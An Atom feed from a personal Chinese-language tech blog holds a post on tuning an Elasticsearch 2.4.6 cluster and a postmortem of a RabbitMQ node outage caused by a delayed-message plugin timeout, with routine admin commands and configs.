<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jesse&#39;s home</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jesse.top/"/>
  <updated>2019-02-17T09:31:38.017Z</updated>
  <id>https://jesse.top/</id>
  
  <author>
    <name>Jesse</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ES集群优化</title>
    <link href="https://jesse.top/2019/01/07/elasticsearch/ES%E9%9B%86%E7%BE%A4%E4%BC%98%E5%8C%96%E6%96%87%E6%A1%A3/"/>
    <id>https://jesse.top/2019/01/07/elasticsearch/ES集群优化文档/</id>
    <published>2019-01-07T01:59:58.000Z</published>
    <updated>2019-02-17T09:31:38.017Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ES集群优化"><a href="#ES集群优化" class="headerlink" title="ES集群优化"></a>ES集群优化</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>时间:2019年01月3号</p><p>支付宝五福活动压测期间</p><hr><h4 id="ES集群架构"><a href="#ES集群架构" class="headerlink" title="ES集群架构"></a>ES集群架构</h4><p>elasticsearch版本:2.4.6</p><p>ES集群服务器: 8台.其中5台16c32g.3台8c16g</p><p>服务器节点: mq-master,mq-slave,hsq-es1,hsq-es2,hsq-es3,hsq-es4,hsq-es5,hsq-es6</p><a id="more"></a><hr><h4 id="资料参考"><a href="#资料参考" class="headerlink" title="资料参考"></a>资料参考</h4><p>官方资料:<a href="https://www.elastic.co/guide/en/elasticsearch/reference/2.4/modules-threadpool.html" target="_blank" rel="noopener">thread pool</a></p><p>官方资料:<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/system-config.html" target="_blank" rel="noopener">系统优化</a></p><hr><h4 id="优化步骤"><a href="#优化步骤" class="headerlink" title="优化步骤"></a>优化步骤</h4><ul><li><strong>系统内核优化</strong></li></ul><p><strong>最大文件打开数</strong>设置为65535还是有点小.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ grep &quot;65536&quot; hsq_elasticsearch.log.2019-01-02</span><br><span class="line">[2019-01-02 14:17:14,740][WARN ][env                      ] [hsq-es1] max file descriptors [65535] for elasticsearch process likely too low, consider increasing to at least [65536]</span><br></pre></td></tr></table></figure><p>修改为102400.修改方式如下:</p><p>1.编辑 /etc/security/limits.conf:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* soft noproc  65535</span><br><span class="line">* hard noproc 65535</span><br><span class="line">* soft nofile 102400</span><br><span class="line">* hard nofile 102400</span><br></pre></td></tr></table></figure><p>然后退出,重新登录shell</p><p>2.如果是supervisor方式启动的进程.还需要修改supervisord.conf文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#修改下面一行</span><br><span class="line">minfds=102400                 ; (min. avail startup file descriptors;default 1024)</span><br></pre></td></tr></table></figure><ul><li><strong>虚拟内存</strong>定义了进程能拥有的最多内存区域.这个是ES官方文档推荐的配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ tail -3 /etc/sysctl.conf</span><br><span class="line">fs.file-max=102400</span><br><span class="line"></span><br><span class="line">vm.max_map_count = 262144  #这一行配置</span><br></pre></td></tr></table></figure><ul><li><strong>memlock</strong>最大锁定内存地址空间 </li></ul><blockquote><p>memlock这步优化实际中没做,当时没将pam_limits.so文件加入启动文件中</p></blockquote><p>在 /etc/security/limits.conf中加入如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* soft memlock unlimited</span><br><span class="line">* hard memlock unlimited</span><br></pre></td></tr></table></figure><blockquote><p>要使limits.conf文件配置生效，必须要确保pam_limits.so文件被加入到启动文件中。</p></blockquote><p>确保/etc/pam.d/login文件中有如下内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session required /lib/security/pam_limits.so</span><br></pre></td></tr></table></figure><p>验证是否生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl localhost:9200/_nodes/stats/process?pretty</span><br></pre></td></tr></table></figure><hr><ul><li><strong>内存优化</strong></li></ul><p>由于新加入的es服务器节点都是16c32g的配置,内存分配总物理内存的70%.大概是22G左右.</p><p><strong>1.编辑环境变量</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">#定义如下环境变量</span><br><span class="line">export ES_HEAP_SIZE=11g</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><ol start="2"><li>如果是supervisor方式启动的进程,还需要定义supervisor配置文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es1 elasticsearch]$ vim /etc/supervisord/conf.d/elasticsearch.conf</span><br><span class="line"></span><br><span class="line">#加入如下一行:</span><br><span class="line">environment=ES_HEAP_SIZE=22g</span><br><span class="line">environment=MAX_OPEN_FILES=102400</span><br></pre></td></tr></table></figure><p>通过ps命令可以看到elasticsearch进程的最大内存数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[work@hsq-es2 ~]$ ps aux | grep elasticsearch</span><br><span class="line">work       782 68.6 62.1 50121636 20372716 ?   Sl   Jan03 925:22 /bin/java -Xms24g -Xmx24g -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=true -Des.path.home=/data/app/elasticsearch-2.4.6 -cp /data/app/elasticsearch-2.4.6/lib/elasticsearch-2.4.6.jar:/data/app/elasticsearch-2.4.6/lib/* org.elasticsearch.bootstrap.Elasticsearch start</span><br></pre></td></tr></table></figure><hr><ul><li><strong>elasticsearch程序优化</strong></li></ul><p>编辑elasticsearch.conf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#线程池的配置###</span><br><span class="line">#fixed 索引线程池类型</span><br><span class="line">threadpool.index.type: fixed</span><br><span class="line">#线程池大小,建议等同于CPU核心数</span><br><span class="line">threadpool.index.size: 16</span><br><span class="line">#队列大小</span><br><span class="line">threadpool.index.queue_size: 6000</span><br><span class="line"></span><br><span class="line">#搜索 线程池类型</span><br><span class="line"></span><br><span class="line">#搜索线程池大小,建议2倍的CPU核心数</span><br><span class="line">threadpool.search.size: 32</span><br><span class="line"># 搜索线程池类型</span><br><span class="line">threadpool.search.type: fixed</span><br><span class="line">#队列大小</span><br><span class="line">threadpool.search.queue_size: 6000</span><br><span class="line"></span><br><span class="line">processors: 16</span><br><span class="line"></span><br><span class="line"># # 缓存类型设置为Soft Reference，只有当内存不够时才会进行回收</span><br><span class="line">index.cache.field.max_size: 50000</span><br><span class="line">index.cache.field.expire: 10m</span><br><span class="line">index.cache.field.type: soft</span><br><span class="line">#</span><br><span class="line"># 查询缓存</span><br><span class="line">indices.queries.cache.size: 20%</span><br><span class="line">index.queries.cache.enabled: true</span><br><span class="line"></span><br><span class="line">indices.requests.cache.size: 10%</span><br><span class="line">index.requests.cache.enable: true</span><br><span class="line"></span><br><span class="line">indices.fielddata.cache.size: 20%</span><br><span class="line"></span><br><span class="line"># #适当增大写入buffer和bulk队列长度</span><br><span class="line">indices.memory.index_buffer_size: 15%</span><br><span class="line">thread_pool.bulk.queue_size: 1024</span><br></pre></td></tr></table></figure><hr><ul><li><strong>es集群节点优化</strong></li></ul><p>参考官方文档: <a href="https://www.elastic.co/guide/en/elasticsearch/reference/2.4/modules-node.html" target="_blank" rel="noopener">Node</a></p><p>关于ES的节点介绍:</p><p>Elasticsearch集群的每个elasticsearch实例都是一个node节点.多个node节点组成了一个cluster.</p><p>集群的每个节点默认都能处理http和传输层流量.传输层专门用于节点之间以及节点和Java TransportClient之间的通信; HTTP层仅由外部REST客户端使用。</p><p>所有节点都可以转发客户端请求到合适的其他节点,除此之外,每个节点服务器还可以承担如下角色:</p><ul><li>Master node</li></ul><p>默认情况下,每个节点都是Master.master节点不代表这个节点就是master角色,而是代表这个节点有参加master选举的资格.master节点控制整个集群</p><p>通过如下方式设置为仅为master节点:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node.master: true</span><br><span class="line">node.data: false</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><p>master节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。普通服务器即可(CPU、内存消耗一般)。</p><ul><li>Data node</li></ul><p>默认情况下,每个节点都是Data节点,Date节点保存数据,并且执行与数据相关的操作,例如搜索,聚合.</p><p>节点没有成为主节点的资格，不参与选举，只会存储数据。在集群中需要单独设置几个这样的节点负责存储数据，后期提供存储和查询服务。主要消耗磁盘，内存。</p><p>通过如下方式设置为仅为数据节点:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: true</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><ul><li>Client node</li></ul><p>client节点不会保存数据,也不会成为master角色,client节点用来转发客户端的请求到master节点, 转发数据相关的操作请求(例如搜索)到data节点,</p><p>通过如下方式设置为仅为client节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: false</span><br></pre></td></tr></table></figure><p>不会成为主节点，也不会存储数据，主要是针对海量请求的时候可以进行负载均衡。普通服务器即可（如果要进行分组聚合操作的话，建议这个节点内存也分配多一点）</p><hr><ul><li><strong>节点规划</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">master 节点 （管理集群作用）</span><br><span class="line"></span><br><span class="line">hsq-es2</span><br><span class="line">hsq-es2-mqslave</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data 数据节点 数据落地查询</span><br><span class="line"></span><br><span class="line">hsq-es2 该节点也作为master节点 </span><br><span class="line">hsq-es3</span><br><span class="line">hsq-es4</span><br><span class="line">hsq-es5</span><br><span class="line">hsq-es6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client节点（不作为master节点 也不作为data 节点） 负载和聚合</span><br><span class="line"></span><br><span class="line">hsq-es2-mqmaster</span><br><span class="line">hsq-es1</span><br></pre></td></tr></table></figure><p>附上hsq-es6的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim elasticsearch.yml</span><br><span class="line"></span><br><span class="line">node.name: hsq-es6</span><br><span class="line">node.master: false</span><br><span class="line">node.data: true</span><br><span class="line">node.client: false</span><br></pre></td></tr></table></figure><hr><ul><li><strong>主分片优化</strong></li></ul><p>访问<a href="http://es.haoshiqi.net/_plugin/kopf/#!/nodes" target="_blank" rel="noopener">http://es.haoshiqi.net/_plugin/kopf/#!/nodes</a> 可以看到集群所有节点</p><p><img src="/Users/huangyong/Desktop/es-1.png" alt=""></p><p>其中可以看到有2台master节点,2台client节点,4台data节点</p><p>将主分片平均分担到各个date节点,如下所示</p><p><img src="/Users/huangyong/Desktop/es-2.png" alt=""></p><p>高亮显示的为主分片</p><p>调整主分片方法如下:</p><p>1.左键点击高亮主分片.点击”select for relocation”</p><p><img src="/Users/huangyong/Desktop/es-3.png" alt=""></p><p>2.点击需要调整后的位置</p><p><img src="/Users/huangyong/Desktop/es-4.png" alt=""></p><p>3.调整后结果如下</p><p><img src="/Users/huangyong/Desktop/es-5.png" alt=""></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ES集群优化&quot;&gt;&lt;a href=&quot;#ES集群优化&quot; class=&quot;headerlink&quot; title=&quot;ES集群优化&quot;&gt;&lt;/a&gt;ES集群优化&lt;/h3&gt;&lt;h4 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h4&gt;&lt;p&gt;时间:2019年01月3号&lt;/p&gt;
&lt;p&gt;支付宝五福活动压测期间&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;ES集群架构&quot;&gt;&lt;a href=&quot;#ES集群架构&quot; class=&quot;headerlink&quot; title=&quot;ES集群架构&quot;&gt;&lt;/a&gt;ES集群架构&lt;/h4&gt;&lt;p&gt;elasticsearch版本:2.4.6&lt;/p&gt;
&lt;p&gt;ES集群服务器: 8台.其中5台16c32g.3台8c16g&lt;/p&gt;
&lt;p&gt;服务器节点: mq-master,mq-slave,hsq-es1,hsq-es2,hsq-es3,hsq-es4,hsq-es5,hsq-es6&lt;/p&gt;
    
    </summary>
    
      <category term="elasticsearch" scheme="https://jesse.top/categories/elasticsearch/"/>
    
    
      <category term="elasticsearch" scheme="https://jesse.top/tags/elasticsearch/"/>
    
  </entry>
  
  <entry>
    <title>线上MQ宕机复盘</title>
    <link href="https://jesse.top/2018/11/21/Linux-%E5%88%86%E5%B8%83%E5%BC%8F&amp;%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/mq/%E7%BA%BF%E4%B8%8AMQ%E5%AE%95%E6%9C%BA%E5%A4%8D%E7%9B%98/"/>
    <id>https://jesse.top/2018/11/21/Linux-分布式&amp;消息队列/mq/线上MQ宕机复盘/</id>
    <published>2018-11-21T09:59:58.000Z</published>
    <updated>2018-12-01T15:07:13.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="线上MQ宕机复盘"><a href="#线上MQ宕机复盘" class="headerlink" title="线上MQ宕机复盘"></a>线上MQ宕机复盘</h2><hr><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>时间:2018年11月20号晚上10点40</p><p>服务器:mq-slave</p><p>故障现象: 钉钉收到报警MQ服务器的rabbitmq进程挂了.手动启动后,过一会超时退出</p><a id="more"></a><hr><p>1.查看日志.提示delayed_message插件超时.无法启动.</p><p>联系开发.可能是白天修改了延时队列机制的缘故</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /var/log/rabbitmq/rabbit@node2</span><br><span class="line"></span><br><span class="line">Error: &#123;&#123;case_clause,&#123;timeout,[rabbit_delayed_messagerabbit@node2]&#125;&#125;, [&#123;rabbit_boot_steps,&apos;-run_step/2-lc$^1/1-1-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,run_step,2, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,&apos;-run_boot_steps/1-lc$^0/1-0-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit_boot_steps,run_boot_steps,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit,start_apps,1,[&#123;file,&quot;src/rabbit.erl&quot;&#125;,&#123;line,447&#125;]&#125;, &#123;rabbit_plugins,ensure,1,[&#123;file,&quot;src/rabbit_plugins.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rpc,&apos;-handle_call_call/6-fun-0-&apos;,5,[&#123;file,&quot;rpc.erl&quot;&#125;,&#123;line,206&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>2.关闭该插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins disable rabbitmq_delayed_message_exchange</span><br><span class="line">he following plugins have been disabled: </span><br><span class="line">rabbitmq_delayed_message_exchange</span><br></pre></td></tr></table></figure><p>3.再次启动.可以成功启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>4.尝试手动启动该插件.仍然超时失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins enable rabbitmq_delayed_message_exchange</span><br><span class="line"></span><br><span class="line">The following plugins have been enabled:</span><br><span class="line">rabbitmq_delayed_message_exchange</span><br><span class="line"></span><br><span class="line">Applying plugin configuration to rabbit@node2... failed. Error: &#123;&#123;case_clause,&#123;timeout,[rabbit_delayed_messagerabbit@node2]&#125;&#125;, [&#123;rabbit_boot_steps,&apos;-run_step/2-lc$^1/1-1-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,run_step,2, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rabbit_boot_steps,&apos;-run_boot_steps/1-lc$^0/1-0-&apos;,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit_boot_steps,run_boot_steps,1, [&#123;file,&quot;src/rabbit_boot_steps.erl&quot;&#125;,&#123;line,26&#125;]&#125;, &#123;rabbit,start_apps,1,[&#123;file,&quot;src/rabbit.erl&quot;&#125;,&#123;line,447&#125;]&#125;, &#123;rabbit_plugins,ensure,1,[&#123;file,&quot;src/rabbit_plugins.erl&quot;&#125;,&#123;line,49&#125;]&#125;, &#123;rpc,&apos;-handle_call_call/6-fun-0-&apos;,5,[&#123;file,&quot;rpc.erl&quot;&#125;,&#123;line,206&#125;]&#125;]&#125;</span><br></pre></td></tr></table></figure><p>5.停止rabbitmq服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server stop</span><br></pre></td></tr></table></figure><hr><p>联系开发.可能是延迟队列消息太多,将服务器的MQ程序卡死,导致插件无响应.从而无法启动.由于MQ使用了2台服务器座位集群,而且使用了镜像队列方式.所以清洗mq-slave服务器这台服务器的数据.重新启动.</p><p>确定是否使用镜像队列方式可以通过以下命令查看.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl list_policies</span><br><span class="line">Listing policies ...</span><br><span class="line">/ha-allall^&#123;&quot;ha-mode&quot;:&quot;all&quot;,&quot;ha-sync-mode&quot;:&quot;automatic&quot;&#125;0</span><br></pre></td></tr></table></figure><p>ha-mode: 代表使用镜像队列.</p><p>ha-sync-mode:表示自动同步数据</p><p>更多信息请网上搜索</p><hr><p>1.关闭插件,重新启动rabbitmq进程.(因为清除数据需要先启动rabbitmq进程)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>2.将这台服务器从集群节点拿掉.不然清楚数据会影响现有的生产环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl stop_app</span><br><span class="line">Stopping node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>3.数据删除完毕后,重新启动rabbitmq节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl start_app Starting node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>4.启动插件.显示已经启动了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oot@node2:~# rabbitmq-plugins enable rabbitmq_delayed_message_exchange</span><br><span class="line">Plugin configuration unchanged.</span><br><span class="line">Applying plugin configuration to rabbit@node2... nothing to do.</span><br></pre></td></tr></table></figure><p>5.显示插件,查看确实已经成功启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmq-plugins list -E</span><br><span class="line"></span><br><span class="line">Configured: E = explicitly enabled; e = implicitly enabled</span><br><span class="line"> | Status:   * = running on rabbit@node2</span><br><span class="line"> |/</span><br><span class="line">[E*] rabbitmq_delayed_message_exchange 0.0.1</span><br><span class="line">[E*] rabbitmq_management               3.6.3</span><br></pre></td></tr></table></figure><p>6.查看节点状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl status</span><br></pre></td></tr></table></figure><p>7.查看集群状态.可以看到只识别到本身这台的节点,没有加入到集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl cluster_status </span><br><span class="line"></span><br><span class="line">Cluster status of node rabbit@node2 ... </span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@node2]&#125;]&#125;, </span><br><span class="line">&#123;running_nodes,[rabbit@node2]&#125;,</span><br><span class="line">&#123;cluster_name,&lt;&lt;&quot;rabbit@node2&quot;&gt;&gt;&#125;, </span><br><span class="line">&#123;partitions,[]&#125;, &#123;alarms,[&#123;rabbit@node2,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure><p>8.关闭这台服务器节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl stop_app Stopping node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>9.加入另外一台node1的集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl join_cluster rabbit@node1 </span><br><span class="line">Clustering node rabbit@node2 with rabbit@node1 ...</span><br></pre></td></tr></table></figure><p>10.启动节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl start_app </span><br><span class="line">Starting node rabbit@node2 ...</span><br></pre></td></tr></table></figure><p>11.查看集群状态.可以看到2个节点都识别到了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl cluster_status</span><br><span class="line">Cluster status of node rabbit@node2 ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@node1,rabbit@node2]&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit@node1,rabbit@node2]&#125;,</span><br><span class="line"> &#123;cluster_name,&lt;&lt;&quot;rabbit@node1&quot;&gt;&gt;&#125;,</span><br><span class="line"> &#123;partitions,[]&#125;,</span><br><span class="line"> &#123;alarms,[&#123;rabbit@node1,[]&#125;,&#123;rabbit@node2,[]&#125;]&#125;]</span><br><span class="line">root@node2:~#</span><br></pre></td></tr></table></figure><p>12.查看日志,可以看到集群正在往该节点上同步数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">=WARNING REPORT==== 21-Nov-2018::00:39:47 === msg_store_persistent: rebuilding indices from scratch</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.marketingcenter.finish_pin_event&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11440.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.msgcenter.app_push_notification&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11444.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.msgcenter.lottery_push_notification&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11448.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;push_robot&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11452.0&gt;</span><br><span class="line"></span><br><span class="line">=INFO REPORT==== 21-Nov-2018::00:39:48 === Mirrored queue &apos;hsq.tradecenter.refund_point&apos; in vhost &apos;/&apos;: Adding mirror on node rabbit@node2: &lt;0.11456.0&gt;</span><br></pre></td></tr></table></figure><p>13.在本节点上查看队列.可以看到队列已经同步过来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@node2:~# rabbitmqctl list_queues</span><br></pre></td></tr></table></figure><p>另外在web控制台上还能看到更详细的信息.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;线上MQ宕机复盘&quot;&gt;&lt;a href=&quot;#线上MQ宕机复盘&quot; class=&quot;headerlink&quot; title=&quot;线上MQ宕机复盘&quot;&gt;&lt;/a&gt;线上MQ宕机复盘&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;时间:2018年11月20号晚上10点40&lt;/p&gt;
&lt;p&gt;服务器:mq-slave&lt;/p&gt;
&lt;p&gt;故障现象: 钉钉收到报警MQ服务器的rabbitmq进程挂了.手动启动后,过一会超时退出&lt;/p&gt;
    
    </summary>
    
      <category term="Linux-分布式&amp;消息队列" scheme="https://jesse.top/categories/Linux-%E5%88%86%E5%B8%83%E5%BC%8F-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
    
      <category term="MQ" scheme="https://jesse.top/tags/MQ/"/>
    
  </entry>
  
  <entry>
    <title>vim使用技巧</title>
    <link href="https://jesse.top/2018/11/21/Linux-Basic/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/vim%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://jesse.top/2018/11/21/Linux-Basic/文本处理/vim使用技巧/</id>
    <published>2018-11-21T04:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.287Z</updated>
    
